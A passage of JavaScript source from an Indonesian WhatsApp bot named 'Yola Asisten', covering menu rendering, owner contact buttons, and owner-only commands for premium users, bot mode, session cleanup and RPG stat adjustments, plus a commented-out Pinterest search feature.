                        func: getRpgMenuText,
                        title: "🛡️ Menu RPG"
                    },
                    'aimenu': {
                        func: getAiMenuText,
                        title: "🤖 Menu AI Yola"
                    },
                    'ownermenu': {
                        func: getOwnerMenuText,
                        title: "👑 Menu Owner",
                        owner: true
                    },
                    'groupmenu': {
                        func: getGroupMenuText,
                        title: "🍀 Menu Grup"
                    },
                    'infobot': {
                        func: (currentPrefix) => getBotInfoText(currentPrefix, startTime, yola),
                        title: "ℹ️ Info Bot"
                    },
                    'tutor': {
                        func: getTutorText,
                        title: "📚 Tutorial Perintah"
                    },
                    'allmenu': {
                        title: "🌸 Semua Menu"
                    },
                    'menu': {
                        title: "💖 Menu Utama"
                    },
                    'help': {
                        title: "💖 Menu Utama"
                    },
                    'cmd': {
                        title: "💖 Menu Utama"
                    }
                };

                let currentMenuData = menuMapping[command] || menuMapping['menu'];
                if (currentMenuData.premium && !isPremium) return reply("────୨ Yola Assistant ৎ────\n🔒 Fitur khusus Premium/Owner.\n────୨ Yola Assistant ৎ────");
                if (currentMenuData.owner && !isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Fitur khusus Owner.\n────୨ Yola Assistant ৎ────");

                let menuTextContent;
                if (command === 'allmenu') {
                    menuTextContent = Object.entries(menuMapping)
                        .filter(([key, data]) => data.func && (!data.premium || isPremium) && (!data.owner || isOwner) && !['infobot', 'allmenu', 'menu', 'help', 'cmd'].includes(key))
                        .map(([key, data]) => data.func(prefix)).join('\n\n');
                    menuFooterText = `赤 Hai Kak ${pushname}, Ini\n${currentMenuData.title}:\n\n${menuInfoText}\n\n${menuTextContent}\n│\n赤 Yola Asisten by ThanDz`;
                } else if (currentMenuData.func && command !== 'menu' && command !== 'help' && command !== 'cmd' && command !== 'infobot') {
                    menuTextContent = currentMenuData.func(prefix);
                    menuFooterText = `赤 Hai Kak ${pushname}, Ini\n${currentMenuData.title}:\n\n${menuTextContent}\n\n赤 Yola Asisten by ThanDz`;
                } else if (command === 'infobot') {
                    menuTextContent = getBotInfoText(prefix, startTime, yola)
                    menuFooterText = `赤 Hai Kak ${pushname}, Ini\n${currentMenuData.title}:\n\n${menuTextContent}\n\n赤 Yola Asisten by ThanDz`;
                }
                 else {
                    menuFooterText = `赤 Hai Kak ${pushname},\nIni Semua Menu Yola Asisten : \n\n${menuInfoText}\n\n赤 Yola Asisten by ThanDz`;
                }


                if (currentMenuStyle === 'V1') {
                    const listMenuTextDecorated = `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ _Gunakan tombol di bawah_\n│✧ _untuk melihat kategori menu!_\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;
                     if (command === 'menu' || command === 'help' || command === 'cmd' || !currentMenuData.func || command === 'infobot') {
                        menuFooterText += `\n\n${listMenuTextDecorated}`;
                    }


                    let headerImageUrl = getRandomThumbnailUrl();
                    let thumbnailUrl = "https://files.catbox.moe/1vl5tv.mp4";

                    let buttons = [];
                    if (command !== 'menu' && command !== 'help' && command !== 'cmd' ) {
                        buttons.push({
                            buttonId: `${prefix}menu`,
                            buttonText: {
                                displayText: 'Kembali ke Menu Utama'
                            },
                            type: 1
                        });
                    } else {
                        buttons.push({
                            buttonId: `${prefix}tqto`,
                            buttonText: {
                                displayText: "Thanks To"
                            },
                        }, {
                            buttonId: `${prefix}owner`,
                            buttonText: {
                                displayText: "👑 Owner"
                            },
                        });
                    }


                    const menuListParams = {
                        title: "Menu Yola Asisten",
                        sections: [{
                            title: "Kategori Menu",
                            highlight_label: "Pilihan",
                            rows: [ {
                                title: "👑 Menu Owner",
                                description: "Menu khusus Owner.",
                                id: `${prefix}ownermenu`,
                            },{
                                title: "🍀 Menu Grup",
                                description: "Menu pengaturan grup.",
                                id: `${prefix}groupmenu`,
                            }, {
                                title: "🛡️ Menu RPG",
                                description: "Petualangan, item, guild, party, dll.",
                                id: `${prefix}rpgmenu`,
                            }, {
                                title: "🤖 Menu AI Yola",
                                description: "Interaksi dengan AI Yola.",
                                id: `${prefix}aimenu`,
                            }, {
                                title: "📚 Tutorial Perintah",
                                description: "Penjelasan semua perintah Yola.",
                                id: `${prefix}tutor`,
                            }, {
                                title: "🌸 Semua Menu (Teks)",
                                description: "Tampilkan semua menu dalam format teks.",
                                id: `${prefix}allmenu`,
                            }, ],
                        }, ],
                    };

                    if (command === 'menu' || command === 'help' || command === 'cmd' || !currentMenuData.func || command === 'infobot') {
                        const flowActions = {
                            buttonId: "menu_list_main",
                            buttonText: {
                                displayText: "  Daftar Kategori"
                            },
                            type: 4,
                            nativeFlowInfo: {
                                name: "single_select",
                                paramsJson: JSON.stringify(menuListParams),
                            },
                        };
                        buttons.push(flowActions);
                    }


                    let buttonMessage = {
                        image: {
                            url: headerImageUrl
                        },
                        caption: (command !== 'menu' && command !== 'help' && command !== 'cmd' && command !== 'infobot' && currentMenuData.func) ? menuFooterText : `\u200B`,
                        footer: (command === 'menu' || command === 'help' || command === 'cmd' || command === 'infobot' || !currentMenuData.func) ? menuFooterText : `Yola Asisten by ThanDz`,
                        buttons: buttons,
                        viewOnce: true,
                        headerType: 4,
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    };


                    await yola.sendMessage(m.chat, buttonMessage, {
                        quoted: qstore
                    });

                } else {
                    if (command === 'menu' || command === 'help' || command === 'cmd' || !currentMenuData.func || command === 'infobot') {
                        menuFooterText += `\n\n${getAllMenuCategoriesText(prefix)}`;
                    }
                    await reply(menuFooterText);
                }
            }
            break;
            case 'tqto': {
                const tqtoTextData = `Allah SWT ( Tuhan )\nOrang Tua ( Dukungan )\nThanDz ( Creator )\nFlow (sister)\nPara Pengguna Yola Asisten 🥰`;
                const mainContent = `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ Arigatouu~!\n│✧\n│✧ ${tqtoTextData.replace(/\n/g, '\n│✧ ')}\n│✧\n│✧ Yola Asisten by ThanDz\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`;

                if (currentMenuStyle === 'V1') {
                    const buttons = [{
                        buttonId: `${prefix}menu`,
                        buttonText: {
                            displayText: 'Kembali ke Menu Utama'
                        },
                        type: 1
                    }];
                    let preparedHeaderMedia = null;
                    const randomThumbForTqto = MENU_THUMBNAILS.tqto || getRandomThumbnailUrl();
                    try {
                        const imageToSend = await getBuffer(randomThumbForTqto);
                        if (imageToSend) {
                            preparedHeaderMedia = await prepareWAMessageMedia({
                                image: imageToSend
                            }, {
                                upload: yola.waUploadToServer
                            });
                        }
                    } catch (e) {
                        preparedHeaderMedia = null;
                    }

                    let messageOptions = {
                        buttons: buttons,
                        footer: 'Yola Asisten by ThanDz',
                        caption: `\u200B`,
                        contextInfo: defaultContextInfoBuilder(pushname, 'tqto')
                    };

                    if (preparedHeaderMedia?.imageMessage) {
                        messageOptions.image = preparedHeaderMedia.imageMessage;
                        messageOptions.headerType = 4;
                        messageOptions.caption = mainContent;
                    } else {
                        messageOptions.text = `${mainContent}`;
                        delete messageOptions.footer;
                        delete messageOptions.caption;
                    }
                    await yola.sendMessage(m.chat, messageOptions, {
                        quoted: m
                    });
                } else {
                    await reply(`${mainContent}`);
                }
            }
            break;

            case 'owner':
            case "yola": {
                await yola.sendMessage(m.chat, {
                    react: {
                        text: "🌸",
                        key: m.key,
                    }
                });
                let menu = `╭── ❀ ⌜ 赤い糸 ⌟ ❀ ──╮\n│✧ Haii Kak ${pushname}, Ini Owner ku >_<\n╰── ❀ ⌜ 赤い糸 ⌟ ❀ ──╯`
                let foto = MENU_THUMBNAILS.owner || getRandomThumbnailUrl();

                if (currentMenuStyle === 'V1') {
                    let msg = generateWAMessageFromContent(m.chat, {
                        viewOnceMessage: {
                            message: {
                                "messageContextInfo": {
                                    "deviceListMetadata": {},
                                    "deviceListMetadataVersion": 2
                                },
                                interactiveMessage: proto.Message.InteractiveMessage.create({
                                    contextInfo: {
                                        mentionedJid: [m.sender],
                                        isForwarded: true,
                                        forwardedNewsletterMessageInfo: {
                                            newsletterName: `Yola`,
                                            newsletterJid: "120363416909921230@newsletter",
                                            serverMessageId: 143
                                        },
                                        businessMessageForwardInfo: {
                                            businessOwnerJid: yola.decodeJid(yola.user.id)
                                        },
                                        externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                                    },
                                    body: proto.Message.InteractiveMessage.Body.create({
                                        text: menu
                                    }),
                                    footer: proto.Message.InteractiveMessage.Footer.create({
                                        text: "Yola by ThanDz"
                                    }),
                                    header: proto.Message.InteractiveMessage.Header.create({
                                        title: `Yola Asisten`,
                                        subtitle: "Bot WhatsApp",
                                        hasMediaAttachment: true,
                                        ...(await prepareWAMessageMedia({
                                            image: {
                                                url: foto
                                            }
                                        }, {
                                            upload: yola.waUploadToServer
                                        }))
                                    }),
                                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                        buttons: [{
                                            "name": "cta_url",
                                            "buttonParamsJson": `{\"display_text\":\"Creator\",\"url\":\"https://wa.me/6287866974026\",\"merchant_url\":\"https://wa.me/6287866974026\"}`
                                        }, {
                                            "name": "cta_url",
                                            "buttonParamsJson": `{\"display_text\":\"Saluran\",\"url\":\"https://whatsapp.com/channel/0029Vb5TgQ8GufIy1sNNxO3s\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vb5TgQ8GufIy1sNNxO3s\"}`
                                        }],
                                    })
                                })
                            }
                        }
                    }, {})

                    await yola.relayMessage(msg.key.remoteJid, msg.message, {
                        messageId: msg.key.id
                    })
                } else {
                    await reply(`${menu}\n\nYola Assistant`);
                    await yola.sendMessage(m.chat, {
                        contacts: {
                            displayName: 'Owner Yola',
                            contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;ThanDz;;;\nFN:ThanDz\nWAID;type=CELL;waid=${global.owner[0]}:+${global.owner[0]}\nEND:VCARD` }]
                        },
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    }, { quoted: m });
                }
            }
            break;

            case 'addprem': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                let usersInput = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : (m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, ''));
                if (!usersInput) return reply(`────୨ Yola Assistant ৎ────\nContoh: ${prefix}addprem @tag atau nomor\n────୨ Yola Assistant ৎ────`);
                let targetJid = usersInput.endsWith('@s.whatsapp.net') ? usersInput : usersInput + '@s.whatsapp.net';
                try {
                    let checkResult = await yola.onWhatsApp(targetJid);
                    if (!checkResult?.[0]?.exists) return reply(`────୨ Yola Assistant ৎ────\n*Nomor ${targetJid.split('@')[0]} salah atau tidak terdaftar.*`);
                    targetJid = checkResult[0].jid;
                    Premium = loadConfig(filePaths.PREMIUM_DB_PATH, []);
                    if (Premium.includes(targetJid)) return reply(`────୨ Yola Assistant ৎ────\n*${targetJid.split("@")[0]} sudah Premium!*`);
                    Premium.push(targetJid);
                    savePremiumUsers(Premium);
                    reply(`────୨ Yola Assistant ৎ────\n✅ *${targetJid.split("@")[0]}* berhasil ditambahkan ke Premium!\n────୨ Yola Assistant ৎ────`, {
                        mentions: [targetJid]
                    });
                } catch (error) {
                    reply(`────୨ Yola Assistant ৎ────\nError saat memeriksa nomor: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'delprem': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                let usersInput = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                if (!usersInput || !usersInput.includes('@s.whatsapp.net')) return reply(`────୨ Yola Assistant ৎ────\nContoh: ${prefix}delprem @tag atau nomor\n────୨ Yola Assistant ৎ────`);
                Premium = loadConfig(filePaths.PREMIUM_DB_PATH, []);
                let userIndex = Premium.indexOf(usersInput);
                if (userIndex === -1) return reply(`────୨ Yola Assistant ৎ────\n@${usersInput.split('@')[0]} bukan Premium.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [usersInput]
                });
                Premium.splice(userIndex, 1);
                savePremiumUsers(Premium);
                reply(`────୨ Yola Assistant ৎ────\n🗑️ @${usersInput.split('@')[0]} dihapus dari Premium.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [usersInput]
                });
            }
            break;
            case 'public': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Mode Pribadi.\n────୨ Yola Assistant ৎ────");
                yola.public = true;
                reply("────୨ Yola Assistant ৎ────\n🔓 Mode Publik.\n────୨ Yola Assistant ৎ────");
            }
            break;
            case 'self': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Mode Pribadi.\n────୨ Yola Assistant ৎ────");
                yola.public = false;
                reply("────୨ Yola Assistant ৎ────\n🔒 Mode Pribadi.\n────୨ Yola Assistant ৎ────");
            }
            break;
            case 'clearsesi':
            case 'clr': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const sessionPath = path.join("./session");
                try {
                    if (!fs.existsSync(sessionPath)) return reply("────୨ Yola Assistant ৎ────\nℹ️ Folder session tidak ditemukan.\n────୨ Yola Assistant ৎ────");
                    const files = await fs.promises.readdir(sessionPath);
                    const sessionFiles = files.filter(file => /\.(json|dict)$/i.test(file) || file.startsWith('pre-key') || file.startsWith('sender-key') || file.startsWith('session-') || file.startsWith('app-state') || file === 'creds.json');
                    if (sessionFiles.length === 0) return reply("────୨ Yola Assistant ৎ────\n✅ Tidak ada file sesi.\n────୨ Yola Assistant ৎ────");
                    let message = `────୨ Yola Assistant ৎ────\n💾 Menemukan ${sessionFiles.length} file sesi:\n${sessionFiles.map((e, i) => `${i + 1}. ${e}`).join("\n")}\n────୨ Yola Assistant ৎ────`;
                    reply(message);
                    await sleep(2000);
                    reply("────୨ Yola Assistant ৎ────\n⏳ Menghapus file sesi...\n────୨ Yola Assistant ৎ────");
                    let deletedCount = 0;
                    for (const file of sessionFiles) {
                        try {
                            await fs.promises.unlink(path.join(sessionPath, file));
                            deletedCount++;
                        } catch (unlinkErr) {}
                    }
                    await sleep(1000);
                    reply(`────୨ Yola Assistant ৎ────\n✅ ${deletedCount}/${sessionFiles.length} file sesi berhasil dihapus.\nBot mungkin perlu direstart/scan ulang.\n────୨ Yola Assistant ৎ────`);
                } catch (err) {
                    reply(`────୨ Yola Assistant ৎ────\n❌ Gagal: ${err.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'enable': {
                if (!isOwner) return reply(`────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────`);
                if (args[0]?.toLowerCase() === 'notifadzan') {
                    if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini hanya bisa digunakan di dalam grup.\n────୨ Yola Assistant ৎ────');
                    const groupId = m.chat;
                    NotifAdzanGroups = loadConfig(filePaths.NOTIF_ADZAN_GROUPS_PATH, []);
                    if (NotifAdzanGroups.includes(groupId)) return reply('────୨ Yola Assistant ৎ────\n🔔 Notif Adzan sudah aktif kok di grup ini.\n────୨ Yola Assistant ৎ────');
                    NotifAdzanGroups.push(groupId);
                    saveNotifAdzanGroups(NotifAdzanGroups);
                    reply('────୨ Yola Assistant ৎ────\n✅ Notif Adzan berhasil diaktifkan untuk grup ini!\n────୨ Yola Assistant ৎ────');
                } else {
                    reply('────୨ Yola Assistant ৎ────\n❓ Fitur apa yang ingin diaktifkan? Contoh: `.enable notifadzan`\n────୨ Yola Assistant ৎ────');
                }
            }
            break;
            case 'disable': {
                if (!isOwner) return reply(`────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────`);
                if (args[0]?.toLowerCase() === 'notifadzan') {
                    if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini hanya bisa digunakan di dalam grup.\n────୨ Yola Assistant ৎ────');
                    const groupId = m.chat;
                    NotifAdzanGroups = loadConfig(filePaths.NOTIF_ADZAN_GROUPS_PATH, []);
                    const index = NotifAdzanGroups.indexOf(groupId);
                    if (index === -1) return reply('────୨ Yola Assistant ৎ────\n🔕 Notif Adzan memang sudah nonaktif kok di grup ini.\n────୨ Yola Assistant ৎ────');
                    NotifAdzanGroups.splice(index, 1);
                    saveNotifAdzanGroups(NotifAdzanGroups);
                    reply('────୨ Yola Assistant ৎ────\n✅ Notif Adzan berhasil dinonaktifkan untuk grup ini.\n────୨ Yola Assistant ৎ────');
                } else {
                    reply('────୨ Yola Assistant ৎ────\n❓ Fitur apa yang ingin dinonaktifkan? Contoh: `.disable notifadzan`\n────୨ Yola Assistant ৎ────');
                }
            }
            break;
            case 'chmv1': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                if (currentMenuStyle === 'V1') return reply("────୨ Yola Assistant ৎ────\nℹ️ Gaya menu sudah V1.\n────୨ Yola Assistant ৎ────");
                currentMenuStyle = 'V1';
                saveMenuStyle();
                reply(`────୨ Yola Assistant ৎ────\n✅ Gaya menu diubah ke V1 (Interaktif)!\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'chmv2': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                if (currentMenuStyle === 'V2') return reply("────୨ Yola Assistant ৎ────\nℹ️ Gaya menu sudah V2.\n────୨ Yola Assistant ৎ────");
                currentMenuStyle = 'V2';
                saveMenuStyle();
                reply(`────୨ Yola Assistant ৎ────\n✅ Gaya menu diubah ke V2 (Teks)!\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'additem': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const targetInput = args[0];
                const itemId = args[1]?.toLowerCase();
                const amountStr = args[2];
                if (!targetInput || !itemId || !amountStr) return reply(`────୨ Yola Assistant ৎ────\nFormat: ${prefix}additem [@tag/id] [item_id] [jumlah]\n────୨ Yola Assistant ৎ────`);
                const amount = parseInt(amountStr);
                if (isNaN(amount) || amount <= 0) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlah item tidak valid.\n────୨ Yola Assistant ৎ────");
                let targetUserJid = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : findUserByRPGID(targetInput.replace('@', ''));
                if (!targetUserJid) {
                    targetUserJid = targetInput.endsWith('@s.whatsapp.net') ? targetInput : `${targetInput.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                }
                if (!registeredUsers[targetUserJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetUserJid.split('@')[0]} tidak terdaftar.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
                if (!rpgItems[itemId]) return reply(`────୨ Yola Assistant ৎ────\n❌ Item ID \`${itemId}\` tidak valid.\n────୨ Yola Assistant ৎ────`);
                if (!registeredUsers[targetUserJid].rpg.inventory) registeredUsers[targetUserJid].rpg.inventory = {};
                registeredUsers[targetUserJid].rpg.inventory[itemId] = (registeredUsers[targetUserJid].rpg.inventory[itemId] || 0) + amount;
                saveUsers(targetUserJid);
                reply(`────୨ Yola Assistant ৎ────\n✅ +${amount}x ${capital(rpgItems[itemId].name)} ke @${targetUserJid.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
            }
            break;
            case 'addgold': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const targetInput = args[0];
                const amountStr = args[1];
                if (!targetInput || !amountStr) return reply(`────୨ Yola Assistant ৎ────\nFormat: ${prefix}addgold [@tag/id] [jumlah]\n────୨ Yola Assistant ৎ────`);
                const amount = parseInt(amountStr);
                if (isNaN(amount)) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlah emas tidak valid.\n────୨ Yola Assistant ৎ────");
                let targetUserJid = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : findUserByRPGID(targetInput.replace('@', ''));
                if (!targetUserJid) {
                    targetUserJid = targetInput.endsWith('@s.whatsapp.net') ? targetInput : `${targetInput.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                }
                if (!registeredUsers[targetUserJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetUserJid.split('@')[0]} tidak terdaftar.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
                if (!registeredUsers[targetUserJid].rpg.currency) registeredUsers[targetUserJid].rpg.currency = {};
                registeredUsers[targetUserJid].rpg.currency.gold = (registeredUsers[targetUserJid].rpg.currency.gold || 0) + amount;
                saveUsers(targetUserJid);
                reply(`────୨ Yola Assistant ৎ────\n✅ ${amount >= 0 ? '+' : ''}${amount} Emas 🪙 ${amount >= 0 ? 'ke' : 'dari'} @${targetUserJid.split('@')[0]}.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetJid]
                });
            }
            break;
            case 'addxp': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const targetInput = args[0];
                const amountStr = args[1];
                if (!targetInput || !amountStr) return reply(`────୨ Yola Assistant ৎ────\nFormat: ${prefix}addxp [@tag/id] [jumlah]\n────୨ Yola Assistant ৎ────`);
                const amount = parseInt(amountStr);
                if (isNaN(amount)) return reply("────୨ Yola Assistant ৎ────\n❌ Jumlah XP tidak valid.\n────୨ Yola Assistant ৎ────");
                let targetUserJid = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : findUserByRPGID(targetInput.replace('@', ''));
                if (!targetUserJid) {
                    targetUserJid = targetInput.endsWith('@s.whatsapp.net') ? targetInput : `${targetInput.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                }
                if (!registeredUsers[targetUserJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetUserJid.split('@')[0]} tidak terdaftar.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
                registeredUsers[targetUserJid].rpg.xp = (registeredUsers[targetUserJid].rpg.xp || 0) + amount;
                registeredUsers[targetUserJid].rpg.totalXpEarned = (registeredUsers[targetUserJid].rpg.totalXpEarned || 0) + amount;
                const leveledUp = checkForLevelUp(targetUserJid, (msg) => reply(msg, { mentionedJid: [targetUserJid] }));
                saveUsers(targetUserJid);
                reply(`────୨ Yola Assistant ৎ────\n✅ ${amount >= 0 ? '+' : ''}${amount} XP ✨ ${amount >= 0 ? 'ke' : 'dari'} @${targetUserJid.split('@')[0]}. ${leveledUp ? '\n🎉 Naik Level!' : ''}\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
            }
            break;
            case 'setlevel': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const targetInput = args[0];
                const levelStr = args[1];
                if (!targetInput || !levelStr) return reply(`────୨ Yola Assistant ৎ────\nFormat: ${prefix}setlevel [@tag/id] [level]\n────୨ Yola Assistant ৎ────`);
                const level = parseInt(levelStr);
                if (isNaN(level) || level < 1) return reply("────୨ Yola Assistant ৎ────\n❌ Level min 1.\n────୨ Yola Assistant ৎ────");
                let targetUserJid = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : findUserByRPGID(targetInput.replace('@', ''));
                if (!targetUserJid) {
                    targetUserJid = targetInput.endsWith('@s.whatsapp.net') ? targetInput : `${targetInput.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                }
                if (!registeredUsers[targetUserJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ Pengguna @${targetUserJid.split('@')[0]} tidak terdaftar.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
                const rpg = registeredUsers[targetUserJid].rpg;
                rpg.level = level;
                rpg.xp = 0;
                rpg.totalXpEarned = rpg.totalXpEarned || 0;
                rpg.xpRequired = xpForNextLevel(level);
                rpg.rank = getRankByTotalXp(rpg.totalXpEarned);
                const updatedStats = calculateStats(rpg);
                rpg.maxHp = updatedStats.maxHp;
                rpg.hp = rpg.maxHp;
                rpg.maxMp = updatedStats.maxMp;
                rpg.mp = rpg.maxMp;
                rpg.atk = updatedStats.atk;
                rpg.def = updatedStats.def;

                saveUsers(targetUserJid);
                reply(`────୨ Yola Assistant ৎ────\n✅ Level @${targetUserJid.split('@')[0]} diatur ke *${level}*.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
            }
            break;
            case 'resetrpg': {
                if (!isOwner) return reply("────୨ Yola Assistant ৎ────\n🔒 Khusus Owner.\n────୨ Yola Assistant ৎ────");
                const targetInput = args[0];
                if (!targetInput) return reply(`────୨ Yola Assistant ৎ────\nFormat: ${prefix}resetrpg [@tag/id]\n────୨ Yola Assistant ৎ────`);
                let targetUserJid = m.mentionedJid && m.mentionedJid.length > 0 ? m.mentionedJid[0] : findUserByRPGID(targetInput.replace('@', ''));
                if (!targetUserJid) {
                    targetUserJid = targetInput.endsWith('@s.whatsapp.net') ? targetInput : `${targetInput.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
                }
                if (!registeredUsers[targetUserJid]?.rpg) return reply(`────୨ Yola Assistant ৎ────\n❌ @${targetUserJid.split('@')[0]} tidak terdaftar.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
                delete registeredUsers[targetUserJid].rpg;
                registeredUsers[targetUserJid].rpgId = undefined;
                saveUsers(targetUserJid);
                reply(`────୨ Yola Assistant ৎ────\n✅ Data RPG @${targetUserJid.split('@')[0]} direset. Perlu *.daftar* ulang.\n────୨ Yola Assistant ৎ────`, {
                    mentions: [targetUserJid]
                });
            }
            break;

            /*case 'pinterest': {
                const PINTEREST_API_URL = "https://api.nekorinn.my.id/search/pinterest";
                const query = text || "Yola Asisten";
                reply(`────୨ Yola Assistant ৎ────\n📌 Mencari gambar di Pinterest untuk: *${query}*...`);
                try {
                    const response = await axios.get(PINTEREST_API_URL, {
                        params: {
                            q: query
                        }
                    });
                    if (response.data?.status === true && response.data.result?.length > 0) {
                        const randomPin = pickRandom(response.data.result);
                        const buttonId = `pinterest_next_${encodeURIComponent(query)}`;

                        let messagePayload = {
                            image: {
                                url: randomPin.imageUrl
                            },
                            caption: `────୨ Yola Assistant ৎ────\nHasil Pinterest: *${query}*`,
                            footer: `Yola Asisten by ThanDz`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        };

                        if (currentMenuStyle === 'V1') {
                            messagePayload.buttons = [{
                                buttonId: buttonId,
                                buttonText: {
                                    displayText: "➡️ Lagi Dong!"
                                },
                                type: 1
                            }];
                            messagePayload.headerType = 4;
                        } else {
                            messagePayload.caption += `\n\nKetik \`${prefix}pinterest ${query}\` untuk gambar berikutnya.\n────୨ Yola Assistant ৎ────`;
                        }

                        await yola.sendMessage(m.chat, messagePayload, {
                            quoted: m
                        });
                    } else {
                        throw new Error("Tidak ada hasil yang ditemukan untuk query tersebut.");
                    }
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Gagal mencari di Pinterest: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'handle_pinterest_next': {
                const PINTEREST_API_URL = "https://api.nekorinn.my.id/search/pinterest";
                const queryEncoded = body.split('_').slice(2).join('_');
                const query = decodeURIComponent(queryEncoded);

                if (!query) {
                    await reply("────୨ Yola Assistant ৎ────\n❌ Aduh, query buat Pinterest-nya ilang nih...\n────୨ Yola Assistant ৎ────");
                    break;
                }
                try {
                    await yola.sendMessage(m.chat, {
                        react: {
                            text: "🔄",
                            key: m.key
                        }
                    });
                    const response = await axios.get(PINTEREST_API_URL, {
                        params: {
                            q: query
                        }
                    });
                    if (response.data?.status === true && response.data.result?.length > 0) {
                        const randomPin = pickRandom(response.data.result);
                        const newButtonId = `pinterest_next_${encodeURIComponent(query)}`;

                        let messagePayload = {
                            image: {
                                url: randomPin.imageUrl
                            },
                            caption: `────୨ Yola Assistant ৎ────\nHasil Pinterest: *${query}*`,
                            footer: `Yola Asisten by ThanDz`,
                            contextInfo: defaultContextInfoBuilder(pushname, 'pinterest')
                        };

                        if (currentMenuStyle === 'V1') {
                            messagePayload.buttons = [{
                                buttonId: newButtonId,
                                buttonText: {
                                    displayText: "➡️ Lagi Dong!"
                                },
                                type: 1
                            }];
                            messagePayload.headerType = 4;
                        } else {
                            messagePayload.caption += `\n\nKetik \`${prefix}pinterest ${query}\` untuk gambar berikutnya.\n────୨ Yola Assistant ৎ────`;
                        }
                        await yola.sendMessage(m.chat, messagePayload, {
                            quoted: m
                        });
                    } else {
                        throw new Error("Tidak ada hasil lagi yang ditemukan untuk query tersebut.");
                    }
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Gagal mencari di Pinterest berikutnya: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'qc': {
                const QC_API_URL = "https://api.nekorinn.my.id/maker/quotechat";
                if (!q) return reply(`────୨ Yola Assistant ৎ────\n❓ Teksnya mana, Kak ${pushname}?\n────୨ Yola Assistant ৎ────`);
                let ppUrl;
                try {
                    ppUrl = await yola.profilePictureUrl(m.sender, "image");
                } catch {
                    ppUrl = DEFAULT_PFP_URL;
                }
                try {
